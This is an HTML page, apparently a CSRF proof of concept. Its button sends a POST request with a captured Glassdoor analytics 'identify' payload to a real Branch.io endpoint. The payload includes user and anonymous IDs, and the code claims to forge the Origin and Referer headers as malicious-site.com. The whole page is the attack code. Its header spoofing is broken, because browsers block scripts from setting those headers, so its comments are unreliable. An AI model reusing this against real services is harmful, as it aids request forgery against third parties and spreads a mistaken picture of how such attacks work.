<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Teste de CSRF</title>
</head>
<body>
    <h1>Teste de CSRF</h1>
    <button id="csrfButton">Enviar Requisição Maliciosa</button>

    <script>
        document.getElementById("csrfButton").addEventListener("click", function() {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://api2.branch.io/v1/identify", true);  // Use o endpoint da aplicação que você está testando
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.setRequestHeader("Origin", "https://www.malicious-site.com");  // Enviar o cabeçalho de origem falso
            xhr.setRequestHeader("Referer", "https://www.malicious-site.com/fakepage");  // Enviar o cabeçalho de referer falso

            var data = JSON.stringify({
                "channel": "web",
                "context": {
                    "app": {
                        "name": "RudderLabs JavaScript SDK",
                        "namespace": "com.rudderlabs.javascript",
                        "version": "2.52.4"
                    },
                    "traits": {
                        "locked state": "open",
                        "color scheme": "Dark",
                        "is validated": true
                    },
                    "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                    "os": {
                        "name": "",
                        "version": ""
                    },
                    "locale": "pt-BR",
                    "screen": {
                        "density": 1,
                        "width": 1920,
                        "height": 1080,
                        "innerWidth": 958,
                        "innerHeight": 944
                    },
                    "timezone": "GMT-0300",
                    "sessionId": 1757205138541,
                    "campaign": {},
                    "page": {
                        "path": "/Job/index.htm",
                        "referrer": "https://www.glassdoor.com.br/",
                        "referring_domain": "www.glassdoor.com.br",
                        "search": "",
                        "title": "Vagas recomendadas para você | Pesquisa de vagas do Glassdoor",
                        "url": "https://www.glassdoor.com.br/Job/index.htm",
                        "tab_url": "https://www.glassdoor.com.br/Job/index.htm",
                        "initial_referrer": "https://www.glassdoor.com.br/Job/index.htm?__cf_chl_tk=vGladNismHmJCgltJ.EZq6u1Vrq_C1Rhu1AYz.bzUII-1757205136-1.0.1.1-tkHjVd9fokbeR7LLzkgko99FSsu6gcFT.SPe3CFamTE",
                        "initial_referring_domain": "www.glassdoor.com.br"
                    }
                },
                "type": "identify",
                "messageId": "e23d53d0-6b11-4921-b777-0a40674554cc",
                "originalTimestamp": "2025-09-07T00:32:33.108Z",
                "anonymousId": "737519ba-1a06-4176-b9df-cc6f04118c82",
                "userId": "331490627",
                "integrations": {
                    "All": true
                },
                "sentAt": "2025-09-07T00:32:33.110Z"
            });

            xhr.send(data);
        });
    </script>
</body>
</html>
